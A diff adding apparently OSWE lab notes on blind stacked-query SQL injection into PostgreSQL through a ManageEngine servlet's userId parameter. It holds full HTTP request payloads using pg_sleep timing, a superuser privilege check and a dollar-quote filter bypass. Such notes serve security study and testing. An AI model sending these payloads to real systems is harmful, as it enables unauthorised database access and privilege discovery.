@@ -1,0 +1,26 @@
+PostgreSQL supports stacked-query:
+
+NOTE:
+We have to put (;) and (--+) in our payloads.
+
+•  (;)  is obligated to close the query in SQL query from the OSWE source code.
+•  (--+) it is obligated to stop the query and comment others queries after our payload.
+
+	1. SQL INJECTION (blind) confirm with sleep function for 10 seconds.
+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10)--+ HTTP/1.1
+
+Host: 192.168.170.113:8443
+
+
+	2. SQL INJECTION (blind) confirm if we have DBA privilege
+
+Simple Query from psql admin tool: select case when current_setting('is_superuser')='on' then pg_sleep(10) end;
+
+Bypass Query: select case when current_setting($$is_superuser$$)='on' then pg_sleep(10) end;
+
+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
+
+Host: manageengine:8443
+The injected query shown will only sleep for 10 seconds if the is_superuser setting from the current_setting table is set to "on."
